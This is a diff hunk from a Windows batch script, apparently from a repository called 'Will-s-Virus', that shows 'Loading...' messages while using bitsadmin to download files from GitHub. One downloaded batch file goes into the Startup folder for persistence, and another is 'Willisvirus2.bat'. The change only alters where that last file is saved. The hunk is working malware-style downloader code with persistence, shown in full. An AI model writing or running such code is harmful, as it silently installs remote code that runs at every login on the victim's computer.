@@ -20,7 +20,7 @@ cls
 echo Loading...
 if not exist "%appdata%\willishot\Messagebox.vbs" bitsadmin /transfer willishot.exe /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/Messagebox.vbs" "%appdata%\willishot\Messagebox.vbs" >nul
 if not exist "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\batstart.bat" bitsadmin /transfer willishot.exe /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/batstart.bat" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\batstart.bat" >nul
-if not exist "%appdata%\Willisvirus2.bat" bitsadmin /transfer willishot.exe /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/Willisvirus2.bat" "%appdata%\Willisvirus2.bat" >nul
+if not exist "%appdata%\Willisvirus2.bat" bitsadmin /transfer willishot.exe /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/Willisvirus2.bat" "%appdata%\willishot\Willisvirus2.bat" >nul
 ping localhost -n 1 >nul
 cls
 echo Loading.
